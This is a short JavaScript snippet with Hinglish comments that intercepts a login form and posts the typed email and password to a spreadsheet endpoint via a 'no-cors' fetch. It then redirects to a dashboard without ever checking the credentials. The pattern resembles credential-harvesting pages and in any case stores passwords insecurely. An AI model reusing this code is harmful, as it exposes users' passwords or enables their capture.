<script>
  // Aapka ekdum sahi wala link
  const SCRIPT_URL = "https://google.com";

  const loginForm = document.querySelector('form'); 
  if (loginForm) {
    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();

      const emailInput = document.querySelector('input[type="email"]').value;
      const passwordInput = document.querySelector('input[type="password"]').value;
      const submitButton = document.querySelector('button[type="submit"]');

      submitButton.innerText = "Checking...";
      submitButton.disabled = true;

      // Data ko sahi format (URL-Encoded) me badalna taaki Google accept kare
      const formData = new URLSearchParams();
      formData.append("action", "login");
      formData.append("email", emailInput);
      formData.append("password", passwordInput);

      fetch(SCRIPT_URL, {
        method: "POST",
        mode: "no-cors", // Browser security error se bachne ke liye
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: formData.toString()
      })
      .then(() => {
        alert("Success! Data Sheet me bhej diya gaya hai.");
        // Login ke baad dashboard page par bhejna
        window.location.href = "dashboard.html"; 
      })
      .catch(error => {
        alert("Error: " + error.message);
        submitButton.innerText = "Sign In";
        submitButton.disabled = false;
      });
    });
  }
</script>
